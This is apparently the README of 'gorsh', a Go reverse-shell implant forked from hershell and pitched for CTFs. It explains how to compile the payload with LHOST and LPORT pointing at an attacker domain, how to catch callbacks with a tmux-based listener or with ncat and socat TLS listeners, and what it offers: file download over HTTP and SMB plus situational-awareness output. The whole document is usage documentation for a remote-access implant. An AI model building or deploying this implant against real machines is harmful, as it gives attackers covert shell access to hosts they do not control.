# gorsh

[go]lang [r]everse [sh]ell

![](https://i.imgur.com/x51XH6K.png)
![](https://i.imgur.com/pvCmHYa.png)

Originally forked from - [sysdream/hershell](https://github.com/sysdream/hershell)

## Motivation

Learn go.  
Make a throwaway reverse shell for things like CTFs.  
Learn about host-based OPSEC considerations when writing an implant.

## Fork Changes
Changes after fork:

* Uses tmux as a pseudo-C2-like interface, creating a new window with each agent callback
* Download files with HTTP on all platform
* Download files with SMB on all windows
* Situational Awareness output on new shells
* Removed Meterpreter functionality
* Removed Shellcode execution
* Remove the use of passing power/shell commands at the gorsh prompt
* Add common file operation commands that use go instead of power/shell

Roadmap:

- [ ] Potentially add reverse socks5 proxy functionality - Using
[Numbers11/rvprxmx](https://github.com/Numbers11/rvprxmx)
- [ ] Recon module for analyzing things like tasks, services, and host-based protections
- [ ] Dotnet integration so `shell` drops into a Runspace with System.Management.Automation. 
      Bacially PowerShell without PowerShell.


## Getting started

Make sure to read the Makefile. It gives you a good idea of what's going on.

Check out the [official documentation](https://golang.org/doc/install) for an intro to developing
with Go and setting up your Golang environment (with the `$GOPATH` environment variable).

### Building the payload

First, you'll need to generate your certs:

```bash
$ make depends
```

You can set the following environment variables to compile using `go build`:

- `GOOS`: the target OS
- `GOARCH`: the target architecture
- `LHOST`: the attacker IP or domain name
- `LPORT`: the listener port

See possible`GOOS`and`GOARCH`variables [here](https://golang.org/doc/install/source#environment).

For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.

Generate with:

```bash
$ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
#or
$ make all LHOST=example.com LPOST=443
```

## Catching the shell

The `make listen` command kicks off a tmux session and creates new windows on every new connection.
Feed it a port number as LPORT.

```sh
make listen LPORT=8080

# once a client connects
tmux attach -t GORSH
```

Shells can also be caught without tmux using:

* socat (not working on macos)
* ncat
* openssl server module
* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)

__Examples__

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
$ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
```

Once executed, you will be provided with the tool's shell.
Type `help` to show what commands are supported.

## Credits

* Initial Work - Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
* Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
